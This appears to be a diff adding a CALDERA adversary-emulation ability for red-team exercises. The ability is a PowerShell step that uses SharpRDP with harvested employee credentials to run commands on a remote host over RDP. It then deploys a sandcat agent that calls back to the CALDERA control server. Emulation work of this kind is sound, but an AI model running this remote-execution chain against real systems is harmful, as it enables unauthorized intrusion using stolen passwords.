@@ -1,0 +1,27 @@
+- id: bee06102-c9a1-42d9-8600-e910f310bdbb
+  name: Initialise RDP RCE Agent
+  description: Execute a command through an RDP session using SharpRDP
+  tactic: initial-access
+  # Also Valid Accounts, but CALDERA doesn't allow tagging an ability with multiple techniques
+  technique:
+    attack_id: T1133
+    name: "External Remote Services"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $caldera_host="#{app.contact.http}";
+          $rce_command=".\SharpRDP.exe computername='#{target.remote.ip}' command='COMMAND' exec=cmd username='#{target.employee.username}' password='#{target.employee.password}'";
+          .\sandcat-rce.exe -server $caldera_host -rceCommand $rce_command -rcePlatform windows -rceExecutor psh -rcePayloadName SharpRDP.exe -originLinkID #{origin_link_id};
+        timeout: 10
+        payloads:
+          - sandcat-rce.exe
+  requirements:
+    - plugins.stockpile.app.requirements.basic:
+        - source: target.employee.password
+          edge: has_password
+          target: target.employee.username
+    - plugins.precomp.app.requirements.has_rdp:
+        - source: target.remote.port
+          edge: has_open_port
+          target: target.remote.ip
